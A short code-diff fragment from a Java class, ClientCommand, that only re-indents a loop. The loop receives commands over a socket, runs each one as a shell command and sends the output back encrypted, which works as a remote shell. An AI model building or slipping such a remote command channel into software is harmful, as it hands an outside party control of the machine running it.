@@ -39,15 +39,15 @@ public class ClientCommand implements IClientCommand {
 
                 }
                 if (isRunning)
-                        System.out.println("Received command: " + command);
+                    System.out.println("Received command: " + command);
                 else break;
                 if (!command.trim().isEmpty()) {
-                        String result = executeShellCommand(command);
-                        System.out.println(result);
-                        ClientSocket.getInstance().sendEncryptedMessage(result);
+                    String result = executeShellCommand(command);
+                    System.out.println(result);
+                    ClientSocket.getInstance().sendEncryptedMessage(result);
                 }
-                }
-            } catch (Exception e) {
+            }
+        } catch (Exception e) {
             throw new RuntimeException(e);
         }
     }
